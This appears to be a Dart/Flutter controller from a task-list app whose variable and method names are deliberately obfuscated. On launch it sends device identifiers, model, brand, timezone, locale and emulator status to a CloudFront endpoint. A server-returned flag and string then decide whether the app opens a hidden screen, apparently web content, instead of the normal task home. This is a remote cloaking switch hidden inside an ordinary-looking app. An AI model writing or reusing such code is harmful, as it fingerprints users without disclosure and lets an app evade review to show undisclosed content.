import 'dart:io';
import 'package:get/get.dart';
import 'package:dio/dio.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';


class TodayTaskEntranceLogic extends GetxController {

  var ktuhnzvdp = RxBool(false);
  var zybngk = RxBool(true);
  var qvuzog = RxString("");
  var thuln = RxBool(false);
  var ytcm = RxBool(true);
  final qkxlnr = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    cajbfg();
  }


  Future<void> cajbfg() async {
    thuln.value = true;
    ytcm.value = true;
    zybngk.value = false;

    qkxlnr.post("https://d1gi6fk70hmu8q.cloudfront.net/nlhcotkbreyqxzwvsmapugidfj",data: await esalzmbh()).then((value) {
      var hkowa = value.data["hkowa"] as String;
      var iqol = value.data["iqol"] as bool;
      if (iqol) {
        qvuzog.value = hkowa;
        ufdsnpxt();
      } else {
        xybwtfk();
      }
    }).catchError((e) {
      zybngk.value = true;
      ytcm.value = true;
      thuln.value = false;
    });
  }

  Future<Map<String, dynamic>> esalzmbh() async {
    final DeviceInfoPlugin phqydt = DeviceInfoPlugin();
    PackageInfo pgonhtb_oerdfz = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var oscf = Platform.localeName;
    var bgid_AfI = currentTimeZone;

    var bgid_Zsl = pgonhtb_oerdfz.packageName;
    var bgid_BuQg = pgonhtb_oerdfz.version;
    var bgid_OYi = pgonhtb_oerdfz.buildNumber;

    var bgid_FpqXCunM = pgonhtb_oerdfz.appName;
    var bgid_tseTOb = "";
    var bgid_NEp  = "";
    var bgid_noWsBKMb = "";
    var wdmc = "";
    var kbmcj = "";
    var kvjlgzpc = "";
    var pfdlyuo = "";
    var enluv = "";
    var icvy = "";
    var kvjocr = "";


    var bgid_RCi = "";
    var bgid_eGH = false;

    if (GetPlatform.isAndroid) {
      bgid_RCi = "android";
      var gjiqckw = await phqydt.androidInfo;

      bgid_noWsBKMb = gjiqckw.brand;

      bgid_tseTOb  = gjiqckw.model;
      bgid_NEp = gjiqckw.id;

      bgid_eGH = gjiqckw.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      bgid_RCi = "ios";
      var ekahmwtubn = await phqydt.iosInfo;
      bgid_noWsBKMb = ekahmwtubn.name;
      bgid_tseTOb = ekahmwtubn.model;

      bgid_NEp = ekahmwtubn.identifierForVendor ?? "";
      bgid_eGH  = ekahmwtubn.isPhysicalDevice;
    }
    var res = {
      "bgid_FpqXCunM": bgid_FpqXCunM,
      "bgid_BuQg": bgid_BuQg,
      "bgid_Zsl": bgid_Zsl,
      "kvjlgzpc" : kvjlgzpc,
      "bgid_tseTOb": bgid_tseTOb,
      "bgid_AfI": bgid_AfI,
      "bgid_NEp": bgid_NEp,
      "oscf": oscf,
      "bgid_RCi": bgid_RCi,
      "bgid_OYi": bgid_OYi,
      "bgid_eGH": bgid_eGH,
      "wdmc" : wdmc,
      "kbmcj" : kbmcj,
      "pfdlyuo" : pfdlyuo,
      "enluv" : enluv,
      "icvy" : icvy,
      "bgid_noWsBKMb": bgid_noWsBKMb,
      "kvjocr" : kvjocr,

    };
    return res;
  }

  Future<void> xybwtfk() async {
    Get.offNamed("/task_home");
  }

  Future<void> ufdsnpxt() async {
    Get.offNamed("/detail_timer");
  }

}
